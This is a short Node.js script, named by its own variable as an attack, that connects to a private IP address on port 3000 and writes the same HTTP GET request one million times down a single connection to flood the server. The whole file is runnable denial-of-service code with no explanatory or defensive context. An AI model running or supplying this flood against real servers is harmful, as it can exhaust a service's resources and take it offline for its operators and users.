var http = require('http');
var net = require('net');

var attack_str = 'GET / HTTP/1.1\r\nHost: 192.168.x.x\r\n\r\n';
var i = 1000000;

var client = net.connect({
	port: 3000,
	host: "172.18.252.86"
}, function() {
	while(i--) {
		client.write(attack_str);
	}
});

client.on('error', function(e) {
	console.log("disconnected");
})
